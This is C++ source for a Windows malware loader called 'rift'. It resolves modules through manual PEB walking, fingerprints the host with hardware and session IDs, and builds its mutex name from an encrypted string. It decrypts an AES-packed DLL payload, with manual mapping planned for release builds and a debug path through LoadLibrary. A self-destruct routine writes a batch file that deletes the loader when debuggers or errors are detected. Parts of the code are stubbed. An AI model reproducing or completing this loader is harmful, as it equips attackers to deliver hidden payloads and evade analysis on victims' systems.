/*--------------------------------*\
 | ! IMPORTANT ! :                |
 | TLS-Callback inside antire.cpp |
\*--------------------------------*/

#include "riftldr.h"

// Global Process Information Block
PIB* g_PIB;

// TODO: fix this mess, for somereason im getting bullshit
HANDLE GetModuleThroughPebX86(
	_In_ const wchar* szMod
) {
	void* pPeb = (void*)(__readfsdword(0x30));
	void* pPebLdrData = (void*)((ptr)pPeb + 0xc);
	LIST_ENTRY* leModList = (LIST_ENTRY*)((ptr)pPebLdrData + 0x14);

	while (leModList->Flink != leModList) {
		void* pLdrData = (void*)((ptr)leModList + sizeof(*leModList));
		void* usDllBaseName = (void*)((ptr)pLdrData + 0x48);
		if (!memcmp((wchar*)((ptr)usDllBaseName + 0x4), szMod, wcslen(szMod)))
			return (HANDLE)((ptr)pLdrData + 0x18);
	}

	return NULL;
}

/*	Services:
	The service system is a syscall like system with multiple levels
	that allowes higher "rings"(modules like the stub and payload(s))
	to use registered functions of lower levels through a simple ABI.
	SVC is chained and the functions to use are registered and identified
	through a id, this id is made out of 2 components:
	- The first 4 bits being the SvcDescriptor (allowing for 16 levels)
	((Note: Each Level can have more than 1 Descriptor reducing the the
	total amount of levels the chain can have (, a level can also have non
	and just pass through controll to one that has a svc)))
	- The following 12 lower bits represent the FunctionId
	there're 4096 - 1 possible functions you can register.
	Each svcDispatcher should contain a TestService with the id 0xfff
	that should return the value 'svc##N' N being the SvcDescriptor.

	The return value is completely dependent on the registered function to be called.
	rift has the functionmodel of returning a status value and using the args as IO,
	there are only a few cases where a funcion either doesnt return anything or a ptr.
*/
namespace svc { // Service Center/Dispatch Level:0 (svcdsp0)
	long svcDispatch0(
		_In_range_(0, 0x0fff) uint16  svcId,
		_In_opt_              va_list val
	) {
	#define v(T) va_arg(val, T)
	// Creates a Entry for a Service in the svcDispatchTable
	// In order to use a void function prepend "0;" to the expr
	#define SDT_ENTRY(Id, expr) case ((0 << 12) | Id & 0x0fff):\
								s = (long)expr;\
								break
		long s;
		switch (svcId) {


			SDT_ENTRY(0xfff, 'svc0'); // TestEntry, a call to svc with id 0xfff should return 'svc##N'
		default:
			s = -1; // Invalid Id, abort
		}
	#undef v

		return s;
	}

	long svcCall(
		_In_range_(0, 0x0fff) uint16 svcId,
		_In_opt_                     ...
	) {
		va_list val;
		va_start(val, svcId);

		long s = svcDispatch0(svcId, val);

		va_end(val);
		return s;
	}
}

int WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     int       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information Block
		g_PIB = (PIB*)malloc(sizeof(PIB));
		g_PIB->sMod.hM = hInstance;
		GetCurrentDirectoryW(MAX_PATH, g_PIB->sMod.szCD);
		GetModuleFileNameW(hInstance, g_PIB->sMod.szMFN, MAX_PATH);
		utl::IGenerateHardwareId(&g_PIB->sID.HW);
		utl::IGenerateSessionId(&g_PIB->sID.SE);
		g_PIB->sArg.v = CommandLineToArgvW(pCmdLine, (int*)&g_PIB->sArg.n);
	}

	// HANDLE hKernel = GetModuleThroughPebX86(L"kernel32");
	// HANDLE hKernel2 = GetModuleHandleW(L"kernel32");

	BOOL IOpenConsole();
	IOpenConsole();

	// WCHAR UUid[UUID_STRLEN + 1];
	// EUidToStringW(&g_PIB->sID.HW, UUid, UUID_STRLEN);

	if (g_PIB->sArg.n > 0) {
		if (!lstrcmpW(g_PIB->sArg.v[0], L"/i")) { // Start Installation

		} else if (!lstrcmpW(g_PIB->sArg.v[0], L"/s")) { // Start Servicemode

		}
	} else { // Userstart

	}

	// Create Random Mutex using SeId
#if 0
	size_t nResult;
	PCWSTR szLocal = DecryptString("/xxatZo5JyvmRnM3Z2HM4g==", &nResult); // L"Local\\"
	PWSTR szMutex = malloc(MAX_PATH * sizeof(WCHAR));
	StringCchCopyW(szMutex, MAX_PATH, szLocal);
	free((void*)szLocal);
	void* pHWID = malloc(sizeof(hash));
	CopyMemory(pHWID, &g_PIB->sID.SE, sizeof(hash));
	PCWSTR szRandom = EAllocRandomBase64StringW((dword*)pHWID, MAX_PATH / 2, MAX_PATH - 7);
	free(pHWID);
	StringCchCatW(szMutex, MAX_PATH, szRandom);
	free((void*)szRandom);
	// CreateMutexW(0, FALSE, szMutex);
#endif

	// init console here
	// check vm here

	{
		if (InternetAttemptConnect(NULL)) {
			// EPrintFW(L"Couldn't connect to Internet-Services.\nSoftware blocks further execution!\n", CON_WARNING);
			status s = ReadConsoleW(GetStdHandle(STD_INPUT_HANDLE), nullptr, 1, nullptr, nullptr);
			return -1;
		}
	}

	void* pWKey = 0; // = utl::IDownloadKey();
	if (!pWKey) {
		PWSTR szKeyBlob = (PWSTR)malloc(MAX_PATH);
		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->sMod.szCD, L"RIFTWKEY"); // Temporery
		dword nKeyBlob;
		pWKey = utl::AllocReadFileW(szKeyBlob, (size_t*)&nKeyBlob);
	} if (pWKey)
		g_PIB->sCry.EK = new cry::Aes(pWKey);
	else
		return 0x45e0;

	size_t nDll = 0;
	void* pDll = 0; //= cry::EUnpackResource(IDR_RIFTDLL, &nDll, g_PIB->sCry.EK);
	if (!pDll)
		return 0x132d;

#ifndef _DEBUG
	// Implement Manual Mapping using BlackBone
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", NULL, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2ab5;


	void* DllMain = GetProcAddress(dhDll, "DllMain");
	status bTest = ((status(WINAPI*)(_In_ HINSTANCE hinstDLL, _In_ dword fdwReason, _In_ void* pvReserved))DllMain)(NULL, 4, g_PIB);

	FreeLibrary(dhDll);
#endif
	SecureZeroMemory(pDll, nDll);
	free(pDll);

	{	// CleanUp
		LocalFree(g_PIB->sArg.v);
		free(g_PIB);
	} return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered (/called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
const static WCHAR l_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID ESelfDestruct() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	PCWSTR szRandom = rng::EAllocRandomPathW(NULL, 8, 16);
	CopyMemory(szFilePath, g_PIB->sMod.szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	wchar* pScriptW = (wchar*)malloc(0x800);
	uint32 uiRandomID = rng::Xoshiro::Instance().XoshiroSS();
	PCWSTR szMFN = utl::GetFileNameFromPathW(g_PIB->sMod.szMFN);
	swprintf_s(pScriptW, 0x800, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, utl::GetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	size_t nScript = wcslen(pScriptW);
	PSTR pScriptA = (PSTR)malloc(0x400);
	WideCharToMultiByte(CP_ACP, NULL, (PWSTR)pScriptW, -1, pScriptA, 0x400, NULL, NULL);
	free(pScriptW);

	// Write to Disk
	utl::WriteFileCW(szFilePath, pScriptA, nScript);
	free(pScriptA);
}